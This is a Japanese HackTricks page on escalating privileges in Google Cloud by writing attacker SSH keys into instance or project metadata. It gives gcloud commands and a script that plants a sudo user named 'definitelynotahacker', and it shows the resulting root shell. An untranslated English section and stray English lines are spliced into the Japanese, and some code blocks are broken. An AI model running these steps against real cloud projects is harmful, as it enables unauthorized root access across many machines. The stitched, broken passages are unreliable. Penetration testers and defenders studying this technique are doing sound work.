# GCP - カスタムSSHメタデータの追加

<details>

<summary><strong>Support HackTricks and get benefits!</strong></summary>

* もし **HackTricks で会社を宣伝したい** または **PEASS の最新バージョンにアクセスしたい** または **HackTricks をPDFでダウンロードしたい** 場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop) をチェックしてください！
* [**公式のPEASS & HackTricksグッズ**](https://peass.creator-spring.com) を手に入れましょう
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) を見つけて、独占的な [**NFTs**](https://opensea.io/collection/the-peass-family) のコレクションを発見しましょう
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f) または [**Telegramグループ**](https://t.me/peass) に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm) をフォローしましょう。
* **ハッキングのトリックを共有するために、PRを** [**HackTricks**](https://github.com/carlospolop/hacktricks) **と** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **のGitHubリポジトリに提出してください。**

</details>

## メタデータの変更 <a href="#modifying-the-metadata" id="modifying-the-metadata"></a>

もしインスタンスのメタデータを変更できる場合、特権をエスカレーションするための数多くの方法があります。この権限を持つサービスアカウントにつながるいくつかのシナリオがあります:

_**デフォルトのサービスアカウント**_\
サービスアカウントのアクセス **スコープ** が **フルアクセス** に設定されているか、少なくとも **コンピュートAPIへのアクセスが明示的に許可されている** 場合、この設定はエスカレーションの **脆弱性** があります。**デフォルトのスコープ** は **脆弱性がない** です。

_**カスタムサービスアカウント**_\
カスタムサービスアカウントを使用する場合、以下のいずれかのIAM権限が特権をエスカレーションするために **必要** です:

* `compute.instances.setMetadata` (単一のインスタンスに影響を与えるため)
* `compute.projects.setCommonInstanceMetadata` (プロジェクト内のすべてのインスタンスに影響を与えるため)

Googleは[推奨しています](https://cloud.google.com/compute/docs/access/service-accounts#associating\_a\_service\_account\_to\_an\_instance)が、カスタムサービスアカウントにアクセススコープを使用することも可能です。以下のいずれかの **アクセススコープ** が必要です:

* `https://www.googleapis.com/auth/compute`
* `https://www.googleapis.com/auth/cloud-platform`

### **カスタムメタデータにSSHキーを追加する**

GCP上の **Linuxシステム** では、通常、[Python Linux Guest Environment for Google Compute Engine](https://github.com/GoogleCloudPlatform/compute-image-packages/tree/master/packages/python-google-compute-engine#accounts) スクリプトが実行されています。その中の1つが [accounts daemon](https://github.com/GoogleCloudPlatform/compute-image-packages/tree/master/packages/python-google-compute-engine#accounts) で、**定期的に** インスタンスのメタデータエンドポイントを **クエリ** して、**認証済みSSH公開鍵の変更** を確認します。

**新しい公開鍵が見つかった場合、それは処理され、ローカルマシンに追加されます**。鍵の形式によっては、**既存のユーザーの `~/.ssh/authorized_keys` ファイルに追加されるか、`sudo` 権限を持つ新しいユーザーが作成されます**。

したがって、サービスアカウントで **カスタムインスタンスメタデータを変更** できる場合、特権アカウントへのSSH権限を取得することで、ローカルシステムで **root権限にエスカレーション** することができます。また、**カスタムプロジェクトメタデータを変更** できる場合、アカウントデーモンを実行している **現在のGCPプロジェクト内の任意のシステム** で **root権限にエスカレーション** することができます。

### **既存の特権ユーザーにSSHキーを追加する**

最初に既存のアカウントに自分のキーを追加してみましょう。これにより、最も騒音の少ない方法で行うことができます。

**既存のSSHキーを持つユーザーをインスタンスで確認**してください。これらのユーザーのうちの1人を選択し、おそらくsudo権限を持っているでしょう。
```bash
gcloud compute instances describe [INSTANCE] --zone [ZONE]
```
## Add Custom SSH Metadata

To escalate privileges in Google Cloud Platform (GCP), you can add custom SSH metadata to a GCP instance. This allows you to gain SSH access to the instance with elevated privileges.

To add custom SSH metadata, follow these steps:

1. Open the GCP Console and navigate to the Compute Engine page.
2. Select the instance to which you want to add custom SSH metadata.
3. Click on the "Edit" button at the top of the page.
4. Scroll down to the "Custom metadata" section.
5. Click on the "Add item" button.
6. In the "Key" field, enter `ssh-keys`.
7. In the "Value" field, enter the SSH public key that you want to use for authentication.
8. Click on the "Save" button to save the changes.

Once the custom SSH metadata is added, you can SSH into the GCP instance using the specified SSH public key. This will grant you elevated privileges on the instance.

It is important to note that adding custom SSH metadata requires the necessary permissions in GCP. Make sure you have the appropriate permissions before attempting this privilege escalation technique.
```
...
metadata:
fingerprint: QCZfVTIlKgs=
items:
...
- key: ssh-keys
value: |-
alice:ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC/SQup1eHdeP1qWQedaL64vc7j7hUUtMMvNALmiPfdVTAOIStPmBKx1eN5ozSySm5wFFsMNGXPp2ddlFQB5pYKYQHPwqRJp1CTPpwti+uPA6ZHcz3gJmyGsYNloT61DNdAuZybkpPlpHH0iMaurjhPk0wMQAMJUbWxhZ6TTTrxyDmS5BnO4AgrL2aK+peoZIwq5PLMmikRUyJSv0/cTX93PlQ4H+MtDHIvl9X2Al9JDXQ/Qhm+faui0AnS8usl2VcwLOw7aQRRUgyqbthg+jFAcjOtiuhaHJO9G1Jw8Cp0iy/NE8wT0/tj9smE1oTPhdI+TXMJdcwysgavMCE8FGzZ alice
bob:ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC2fNZlw22d3mIAcfRV24bmIrOUn8l9qgOGj1LQgOTBPLAVMDAbjrM/98SIa1NainYfPSK4oh/06s7xi5B8IzECrwqfwqX0Z3VbW9oQbnlaBz6AYwgGHE3Fdrbkg/Ew8SZAvvvZ3bCwv0i5s+vWM3ox5SIs7/W4vRQBUB4DIDPtj0nK1d1ibxCa59YA8GdpIf797M0CKQ85DIjOnOrlvJH/qUnZ9fbhaHzlo2aSVyE6/wRMgToZedmc6RzQG2byVxoyyLPovt1rAZOTTONg2f3vu62xVa/PIk4cEtCN3dTNYYf3NxMPRF6HCbknaM9ixmu3ImQ7+vG3M+g9fALhBmmF bob
...
```
公開鍵の形式が**少し変わっている**ことに注意してください - ユーザー名が**先頭**にリストされ（コロンに続いて）、再び**末尾**にリストされています。この形式に合わせる必要があります。通常のSSH鍵の操作とは異なり、ユーザー名は重要です！

ユーザー名と鍵の行を新しいテキストファイル`meta.txt`に**保存**します。

上記の例でユーザー`alice`をターゲットにしていると仮定しましょう。次のように、自分自身のために**新しい鍵を生成**します：
```bash
ssh-keygen -t rsa -C "alice" -f ./key -P "" && cat ./key.pub
```
新しい公開鍵を`meta.txt`ファイルに追加し、以下の形式を模倣してください：
```
alice:ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC/SQup1eHdeP1qWQedaL64vc7j7hUUtMMvNALmiPfdVTAOIStPmBKx1eN5ozSySm5wFFsMNGXPp2ddlFQB5pYKYQHPwqRJp1CTPpwti+uPA6ZHcz3gJmyGsYNloT61DNdAuZybkpPlpHH0iMaurjhPk0wMQAMJUbWxhZ6TTTrxyDmS5BnO4AgrL2aK+peoZIwq5PLMmikRUyJSv0/cTX93PlQ4H+MtDHIvl9X2Al9JDXQ/Qhm+faui0AnS8usl2VcwLOw7aQRRUgyqbthg+jFAcjOtiuhaHJO9G1Jw8Cp0iy/NE8wT0/tj9smE1oTPhdI+TXMJdcwysgavMCE8FGzZ alice
bob:ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC2fNZlw22d3mIAcfRV24bmIrOUn8l9qgOGj1LQgOTBPLAVMDAbjrM/98SIa1NainYfPSK4oh/06s7xi5B8IzECrwqfwqX0Z3VbW9oQbnlaBz6AYwgGHE3Fdrbkg/Ew8SZAvvvZ3bCwv0i5s+vWM3ox5SIs7/W4vRQBUB4DIDPtj0nK1d1ibxCa59YA8GdpIf797M0CKQ85DIjOnOrlvJH/qUnZ9fbhaHzlo2aSVyE6/wRMgToZedmc6RzQG2byVxoyyLPovt1rAZOTTONg2f3vu62xVa/PIk4cEtCN3dTNYYf3NxMPRF6HCbknaM9ixmu3ImQ7+vG3M+g9fALhBmmF bob
alice:ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDnthNXHxi31LX8PlsGdIF/wlWmI0fPzuMrv7Z6rqNNgDYOuOFTpM1Sx/vfvezJNY+bonAPhJGTRCwAwytXIcW6JoeX5NEJsvEVSAwB1scOSCEAMefl0FyIZ3ZtlcsQ++LpNszzErreckik3aR+7LsA2TCVBjdlPuxh4mvWBhsJAjYS7ojrEAtQsJ0mBSd20yHxZNuh7qqG0JTzJac7n8S5eDacFGWCxQwPnuINeGoacTQ+MWHlbsYbhxnumWRvRiEm7+WOg2vPgwVpMp4sgz0q5r7n/l7YClvh/qfVquQ6bFdpkVaZmkXoaO74Op2Sd7C+MBDITDNZPpXIlZOf4OLb alice
```
以下のコマンドを使用して、インスタンスのSSHキーメタデータを**再書き込み**できます。
```bash
gcloud compute instances add-metadata [INSTANCE] --metadata-from-file ssh-keys=meta.txt
```
次のようにして、`alice`のコンテキストでシェルにアクセスできます：

```bash
ssh alice@<instance-ip>
```

Replace `<instance-ip>` with the IP address of the instance you want to access.
```
lowpriv@instance:~$ ssh -i ./key alice@localhost
alice@instance:~$ sudo id
uid=0(root) gid=0(root) groups=0(root)
```
### **特権ユーザーを作成し、SSHキーを追加する**

上記の手順に従っても既存のキーが見つからない場合、`/etc/passwd`に興味深い他のユーザーはいませんか？

上記と同じ手順に従い、ただ新しいユーザー名を作成するだけで**同じプロセスを実行**できます。このユーザーは自動的に作成され、`sudo`の権限が与えられます。スクリプトを使用すると、プロセスは次のようになります：
```bash
# define the new account username
NEWUSER="definitelynotahacker"

# create a key
ssh-keygen -t rsa -C "$NEWUSER" -f ./key -P ""

# create the input meta file
NEWKEY="$(cat ./key.pub)"
echo "$NEWUSER:$NEWKEY" > ./meta.txt

# update the instance metadata
gcloud compute instances add-metadata [INSTANCE_NAME] --metadata-from-file ssh-keys=meta.txt

# ssh to the new account
ssh -i ./key "$NEWUSER"@localhost
```
### プロジェクトレベルのSSHキー <a href="#sshing-around" id="sshing-around"></a>

前のセクションで説明した詳細に従って、さらにVMを侵害しようとすることができます。

[**プロジェクトレベルでSSHキーを適用する**](https://cloud.google.com/compute/docs/instances/adding-removing-ssh-keys#project-wide)ことにより、明示的に「プロジェクト全体のSSHキーをブロックする」オプションを選択していない場合、特権アカウントにSSHできる権限が与えられます。
```
gcloud compute project-info add-metadata --metadata-from-file ssh-keys=meta.txt
```
もし本当に大胆なら、単に `gcloud compute ssh [INSTANCE]` と入力するだけで、他のボックスで現在のユーザー名を使用することもできます。

<details>

<summary><strong>Support HackTricks and get benefits!</strong></summary>

* もし **HackTricks であなたの会社を宣伝したい** または **PEASS の最新バージョンにアクセスしたい** または **HackTricks を PDF でダウンロードしたい** 場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop) をチェックしてください！
* [**公式の PEASS & HackTricks スワッグ**](https://peass.creator-spring.com) を手に入れましょう
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) を見つけて、独占的な [**NFTs**](https://opensea.io/collection/the-peass-family) のコレクションを発見しましょう
* 💬 [**Discord グループ**](https://discord.gg/hRep4RUj7f) または [**telegram グループ**](https://t.me/peass) に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm) をフォローしてください。
* **ハッキングのトリックを共有するために、PR を** [**HackTricks**](https://github.com/carlospolop/hacktricks) **と** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **の GitHub リポジトリに提出してください。**

</details>
